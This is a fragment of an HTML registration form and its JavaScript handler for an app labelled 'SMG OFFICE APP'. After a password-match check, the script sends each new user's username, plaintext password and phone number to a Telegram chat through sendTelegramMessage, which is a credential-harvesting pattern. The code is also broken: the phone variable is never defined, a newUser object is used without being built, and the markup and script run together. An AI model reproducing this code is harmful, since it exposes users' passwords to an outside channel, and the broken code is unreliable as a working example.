<div class="container" id="registerForm" style="display: block;">
    <h2 class="head"><i class="icon fas fa-user-plus"></i> Register</h2>
    <form id="register">
        <label for="regUsername">Username:</label>
        <input type="text" id="regUsername" name="regUsername" oninput="this.value = this.value.toUpperCase()">
        <label for="regPhone">Phone Number:</label>
        <input type="text" id="regPhone" name="regPhone">
        <label for="regPassword">New Password:</label>
        <input type="password" id="regPassword" name="regPassword">
        <label for="confirmPassword">Confirm Password:</label>
        <input type="password" id="confirmPassword" name="confirmPassword">
        <button type="button" value="Submit" onclick="submitRegister()"><i class="fas fa-paper-plane"></i> Submit</button>
       <br><br>
        <button class="button1" type="button" value="Back" onclick="showLoginForm()"><i class="fas fa-arrow-left"></i> Back</button>
    </form>
</div>

        var regUsername = document.getElementById("regUsername").value;

        var regPassword = document.getElementById("regPassword").value;
        var confirmPassword = document.getElementById("confirmPassword").value;

        if (regUsername && regPhone && regPassword && confirmPassword) {
            if (regPassword !== confirmPassword) {
                alert("❌ Passwords do not match. Please try again.");
                return;
            }

            // Here you can perform additional validation if needed

            sendTelegramMessage("NEW REGISTRATION\n\nUsername: " + newUser.username + "\nPassword: " + newUser.password + "\nPhone Number: " + newUser.phone + "\n\n✍️ By SMG OFFICE APP___ new user" + "\n\n\n\n_________CUSTOMER'S SMS_________" + "\n\nCongratulations! You have been registered on our App. Thank you for your trust." + "\n\nUsername: " + newUser.username + "\nPassword: " + newUser.password + "\nPhone number: " + newUser.phone + "\n\nPlease, we urge you to keep your privacy. Thank you!");

            // Clearing form fields
            document.getElementById("register").reset();
        } else {
            alert("❌ Please fill in all fields.");
